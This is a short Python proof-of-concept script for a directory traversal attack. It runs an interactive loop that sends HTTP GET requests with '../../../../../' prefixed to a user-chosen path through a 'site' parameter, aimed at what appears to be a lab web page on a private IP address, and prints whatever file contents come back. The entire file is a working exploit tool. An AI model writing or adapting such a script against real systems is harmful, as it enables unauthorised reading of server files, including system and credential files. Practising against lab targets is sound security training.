#!/usr/bin/env python3 -tt
#-*- coding: utf-8 -*-
import requests

def main():
    """
		Dir path traversal through http get POC
    """
    sesh=requests.session()
    
    url=r'http://192.168.1.161/security/8/index.php'
    dir=r'?site=../../../../../'
    user_in=''

    while True:

        # Windows/System32/eula.txt
        user_in=input('enter dir trav, or quit$ to quit: ')
        
        if 'quit$' in user_in:

            print('User kill recv!')
            exit()
            
        else:
            resp=sesh.get(url+dir+user_in)

            print(resp.content)
            print('GET url: {}'.format(url+dir+user_in))

if __name__ == '__main__':
	main()
